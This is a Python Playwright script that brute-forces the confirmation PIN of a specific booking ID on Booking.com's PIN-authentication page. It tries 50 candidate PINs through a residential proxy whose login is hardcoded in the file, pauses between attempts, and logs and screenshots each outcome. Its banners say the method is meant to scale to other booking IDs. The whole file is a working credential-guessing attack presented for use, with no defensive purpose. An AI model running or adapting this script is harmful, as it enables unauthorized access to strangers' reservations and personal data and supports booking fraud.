#!/usr/bin/env python3
"""
TARGETED PIN TESTER - Booking ID: 5727559423
Tests specific 50 PINs to find the correct one
Once found, can be used for automation system with other booking IDs
"""

from playwright.sync_api import sync_playwright
import os
import time
import json
import sys
from datetime import datetime
from colorama import Fore, Back, Style, init

# Initialize colorama for colored output
init(autoreset=True)

# Configuration
TARGET_BOOKING_ID = "5727559423"
AGENT_NAME = "TARGETED_TESTER"
HEADLESS = False  # Show browser for testing
WAIT_TIME = 3  # seconds between attempts
SCREEN_DIR = "screenshots_targeted"
SUCCESS_FILE = f"TARGETED_SUCCESS_{TARGET_BOOKING_ID}.json"
LOG_FILE = f"targeted_test_log_{TARGET_BOOKING_ID}.txt"

# The 50 specific PINs to test (one of these is correct)
TARGET_PINS = [
    "8745", "7864", "9636", "2537", "1083", "4729", "6591", "2376", "9854", "7162",
    "3407", "8941", "6215", "5038", "7920", "3816", "4359", "2684", "1973", "8496",
    "6027", "9345", "7812", "4108", "3590", "2390", "2257", "9174", "3065", "4732",
    "5648", "7291", "8126", "6580", "2491", "3906", "8753", "6420", "1235", "9867",
    "3072", "6184", "4721", "7913", "3850", "2486", "9615", "1348", "5093", "7249"
]

# Proxy configuration
PROXY_CONFIG = {
    "server": "http://us-pr.oxylabs.io:10000",
    "username": "customer-phantomnet1_ONP6z",
    "password": "phantomnet1_ONP6z"
}

# Create directories
os.makedirs(SCREEN_DIR, exist_ok=True)

def log_result(pin, result, url, attempt_num):
    """Log result to file"""
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log_entry = f"{timestamp},{TARGET_BOOKING_ID},{AGENT_NAME},{pin},{result},{url},attempt_{attempt_num}\n"
    
    with open(LOG_FILE, 'a', encoding='utf-8') as f:
        f.write(log_entry)
    
    print(f"[{timestamp}] Attempt {attempt_num}/50 - PIN {pin}: {result}")

def display_victory_banner(pin, attempt_num):
    """Display victory banner when correct PIN is found"""
    banner = f"""
{Fore.GREEN}{Style.BRIGHT}
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║                    🎉 CORRECT PIN FOUND! 🎉                                  ║
║                                                                              ║
║  Target Booking ID: {TARGET_BOOKING_ID}                                      ║
║  WINNING PIN: {pin}                                                        ║
║  Agent: {AGENT_NAME}                                                         ║
║  Attempt Number: {attempt_num}/50                                            ║
║  Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}                  ║
║                                                                              ║
║  🚀 READY FOR AUTOMATION WITH OTHER BOOKING IDs! 🚀                         ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
"""
    print(banner)

def test_specific_pin(pin, attempt_num):
    """Test a specific PIN - returns True if successful"""
    try:
        print(f"{Fore.YELLOW}[{AGENT_NAME}] Testing PIN {attempt_num}/50: {pin}{Style.RESET_ALL}")
        
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=HEADLESS, proxy=PROXY_CONFIG)
            page = browser.new_page()

            try:
                # Navigate to booking confirmation page
                page.goto("https://secure.booking.com/help/confirmation_pin_auth", wait_until="load", timeout=30000)

                # Fill in booking ID and PIN
                page.wait_for_selector('input[placeholder="e.g. 1234567890"]', timeout=15000)
                page.fill('input[placeholder="e.g. 1234567890"]', TARGET_BOOKING_ID)
                page.fill('input[placeholder="e.g. 1234"]', pin)

                # Click Continue button
                try:
                    page.wait_for_selector('button:has-text("Continue")', timeout=5000)
                    page.click('button:has-text("Continue")')
                except Exception:
                    page.wait_for_selector('button[type="submit"]', timeout=5000)
                    page.click('button[type="submit"]')

                # Wait for result
                page.wait_for_function(
                    """
                    () => {
                        return location.href.includes('unique_order_id') ||
                               document.querySelector('.bui-alert--error') !== null
                    }
                    """,
                    timeout=30000
                )

                current_url = page.url
                
                if "unique_order_id=" in current_url:
                    # SUCCESS!
                    page.screenshot(path=f"{SCREEN_DIR}/{TARGET_BOOKING_ID}_{pin}_SUCCESS.png")
                    log_result(pin, 'SUCCESS', current_url, attempt_num)
                    
                    # Save success details
                    success_data = {
                        'success_pin': pin,
                        'agent': AGENT_NAME,
                        'booking_id': TARGET_BOOKING_ID,
                        'timestamp': datetime.now().isoformat(),
                        'attempt_number': attempt_num,
                        'total_pins_tested': 50,
                        'url': current_url,
                        'message': 'CORRECT PIN FOUND FROM TARGETED LIST'
                    }
                    with open(SUCCESS_FILE, 'w') as f:
                        json.dump(success_data, f, indent=2)
                    
                    print(f"{Fore.GREEN}🎉 SUCCESS! PIN {pin} is CORRECT!{Style.RESET_ALL}")
                    display_victory_banner(pin, attempt_num)
                    return True
                    
                elif page.query_selector('.bui-alert--error'):
                    # Failed
                    page.screenshot(path=f"{SCREEN_DIR}/{TARGET_BOOKING_ID}_{pin}_FAIL.png")
                    log_result(pin, 'FAILURE', current_url, attempt_num)
                    print(f"{Fore.RED}❌ PIN {pin} failed{Style.RESET_ALL}")
                    return False
                    
                else:
                    # Unknown result
                    page.screenshot(path=f"{SCREEN_DIR}/{TARGET_BOOKING_ID}_{pin}_UNKNOWN.png")
                    log_result(pin, 'UNKNOWN', current_url, attempt_num)
                    print(f"{Fore.YELLOW}❓ PIN {pin} - unknown result{Style.RESET_ALL}")
                    return False
                    
            finally:
                browser.close()
                
    except Exception as e:
        error_msg = f'EXCEPTION: {str(e)[:200]}'
        log_result(pin, error_msg, 'N/A', attempt_num)
        print(f"{Fore.RED}💥 Exception testing PIN {pin}: {str(e)[:100]}{Style.RESET_ALL}")
        return False

def main():
    """Main function - Test all 50 specific PINs"""
    
    # Check if success already found
    if os.path.exists(SUCCESS_FILE):
        try:
            with open(SUCCESS_FILE, 'r') as f:
                success_data = json.load(f)
            print(f"{Fore.GREEN}✅ SUCCESS ALREADY FOUND!")
            print(f"PIN: {success_data['success_pin']}")
            print(f"Attempt: {success_data['attempt_number']}/50{Style.RESET_ALL}")
            return
        except:
            pass
    
    # Display startup banner
    print(f"""
{Fore.CYAN}{Style.BRIGHT}
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║                    🎯 TARGETED PIN TESTER STARTING 🎯                        ║
║                                                                              ║
║  Target Booking ID: {TARGET_BOOKING_ID}                                      ║
║  Agent: {AGENT_NAME}                                                         ║
║  Total PINs to test: 50                                                     ║
║  Wait time: {WAIT_TIME} seconds                                              ║
║  Expected: ONE of these 50 PINs is correct                                 ║
║                                                                              ║
║                        🚀 TESTING BEGINS! 🚀                                ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
""")
    
    # Test each PIN in sequence
    for i, pin in enumerate(TARGET_PINS, 1):
        print(f"\n{Fore.BLUE}📍 Testing PIN {i}/50: {pin}{Style.RESET_ALL}")
        
        # Test the PIN
        if test_specific_pin(pin, i):
            # Success found - stop immediately
            print(f"{Fore.GREEN}🎯 CORRECT PIN FOUND! Stopping test.{Style.RESET_ALL}")
            break
        
        # Wait before next attempt (except last attempt)
        if i < len(TARGET_PINS):
            print(f"{Fore.BLUE}⏱️ Waiting {WAIT_TIME} seconds before next PIN...{Style.RESET_ALL}")
            time.sleep(WAIT_TIME)
    
    # Final report
    print(f"\n{Fore.CYAN}{'='*80}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}📊 TARGETED TEST COMPLETE{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*80}{Style.RESET_ALL}")
    
    if os.path.exists(SUCCESS_FILE):
        with open(SUCCESS_FILE, 'r') as f:
            success_data = json.load(f)
        print(f"{Fore.GREEN}✅ MISSION STATUS: SUCCESS!")
        print(f"🎯 Correct PIN: {success_data['success_pin']}")
        print(f"📍 Found at attempt: {success_data['attempt_number']}/50")
        print(f"🚀 Ready for automation with other booking IDs!{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}❌ MISSION STATUS: NO SUCCESS FOUND")
        print(f"🤔 None of the 50 PINs worked")
        print(f"💡 Consider checking the PIN list or booking ID{Style.RESET_ALL}")
    
    print(f"{Fore.CYAN}{'='*80}{Style.RESET_ALL}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}❌ Test interrupted by user{Style.RESET_ALL}")
        sys.exit(1)
    except Exception as e:
        print(f"\n{Fore.RED}💥 Unexpected error: {str(e)}{Style.RESET_ALL}")
        sys.exit(1)
